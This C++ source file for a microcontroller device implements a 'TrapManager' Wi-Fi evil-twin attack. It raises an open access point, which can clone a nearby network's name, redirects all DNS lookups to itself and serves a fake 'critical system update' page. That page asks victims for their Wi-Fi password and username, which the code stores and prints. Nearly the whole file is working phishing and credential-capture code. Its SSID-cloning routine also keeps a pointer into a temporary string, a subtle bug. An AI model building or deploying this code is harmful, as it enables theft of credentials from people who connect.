/*
 * NOCTURNE_OS — TrapManager: Open AP + DNS hijack + dark captive portal.
 */
#include "TrapManager.h"
#include <DNSServer.h>
#include <WebServer.h>
#include <WiFi.h>

static const char *TRAP_SSID_DEFAULT = "MT_FREE";
static const byte DNS_PORT = 53;
static const IPAddress AP_IP(192, 168, 4, 1);
static const IPAddress AP_NETMASK(255, 255, 255, 0);

DNSServer dnsServer;
WebServer server(80);

TrapManager::TrapManager() {
  lastPassword_[0] = '\0';
  clonedSSID_[0] = '\0';
  useClonedSSID_ = false;
}

void TrapManager::start() {
  if (active_)
    return;
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(AP_IP, AP_IP, AP_NETMASK);
  const char *ssidToUse = useClonedSSID_ && clonedSSID_[0] != '\0'
                              ? clonedSSID_
                              : TRAP_SSID_DEFAULT;
  WiFi.softAP(ssidToUse, nullptr, 1, 0, 4);
  dnsServer.start(DNS_PORT, "*", AP_IP);
  setupHandlers();
  server.begin();
  active_ = true;
  Serial.println("[TRAP] AP up: " + String(ssidToUse));
}

void TrapManager::stop() {
  if (!active_)
    return;
  server.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  active_ = false;
  Serial.println("[TRAP] AP down.");
}

void TrapManager::setupHandlers() {
  server.on("/", HTTP_GET, [this]() { servePortal(); });
  server.on("/", HTTP_POST, [this]() { handlePost(); });
  server.onNotFound([this]() { servePortal(); });
}

void TrapManager::servePortal() {
  const char *html =
      "<!DOCTYPE html><html><head><meta name='viewport' "
      "content='width=device-width,initial-scale=1'><title>System "
      "Update</title><style>"
      "body{background:#0d0d0d;color:#c0c0c0;font-family:sans-serif;padding:"
      "20px;}"
      "h1{color:#e0e0e0;font-size:1.2em;} .box{background:#1a1a1a;border:1px "
      "solid #333;padding:16px;margin:12px 0;} input{width:100%;padding:8px;"
      "margin:6px 0;background:#222;color:#fff;border:1px solid #444;} "
      "button{background:#336;color:#fff;border:none;padding:10px "
      "20px;margin-top:8px;}</style></head><body>"
      "<h1>CRITICAL SYSTEM UPDATE</h1>"
      "<p>To maintain connection, enter your home WiFi password for "
      "verification.</p>"
      "<form method='POST' class='box'>"
      "<label>Username / Email</label><input type='text' name='username' "
      "placeholder='Username'>"
      "<label>WiFi Password</label><input type='password' name='password' "
      "placeholder='Password'>"
      "<button type='submit'>Verify</button></form></body></html>";
  server.send(200, "text/html", html);
}

void TrapManager::handlePost() {
  if (!server.hasArg("password"))
    server.send(400, "text/plain", "Missing password");
  else {
    String user = server.hasArg("username") ? server.arg("username") : "";
    String pass = server.arg("password");
    logsCaptured_++;
    size_t len = pass.length();
    if (len >= TRAP_LAST_PASSWORD_LEN)
      len = TRAP_LAST_PASSWORD_LEN - 1;
    pass.toCharArray(lastPassword_, len + 1);
    lastPassword_[len] = '\0';
    lastPasswordShowUntil_ = millis() + TRAP_LAST_PASSWORD_DISPLAY_MS;
    Serial.printf("[TRAP] LOG #%d user='%s' pass='%s'\n", logsCaptured_,
                  user.c_str(), lastPassword_);
    server.send(
        200, "text/html",
        "<!DOCTYPE html><html><body style='background:#0d0d0d;color:#c0c0c0;"
        "font-family:sans-serif;padding:20px;'><h1>Verification "
        "submitted.</h1><p>Connection will be updated "
        "shortly.</p></body></html>");
  }
}

void TrapManager::tick() {
  if (!active_)
    return;
  dnsServer.processNextRequest();
  server.handleClient();
}

void TrapManager::setClonedSSID(int scanIndex) {
  int n = WiFi.scanComplete();
  if (n <= 0 || scanIndex < 0 || scanIndex >= n) {
    useClonedSSID_ = false;
    clonedSSID_[0] = '\0';
    return;
  }
  // Optimized: use c_str() instead of String
  const char *ssid = WiFi.SSID(scanIndex).c_str();
  if (!ssid || strlen(ssid) == 0) {
    useClonedSSID_ = false;
    clonedSSID_[0] = '\0';
    return;
  }
  size_t len = strlen(ssid);
  if (len >= 33)
    len = 32;
  strncpy(clonedSSID_, ssid, len);
  clonedSSID_[len] = '\0';
  useClonedSSID_ = true;
  Serial.println("[TRAP] Cloned SSID: " + String(clonedSSID_));
}

int TrapManager::getClientCount() const {
  return active_ ? WiFi.softAPgetStationNum() : 0;
}
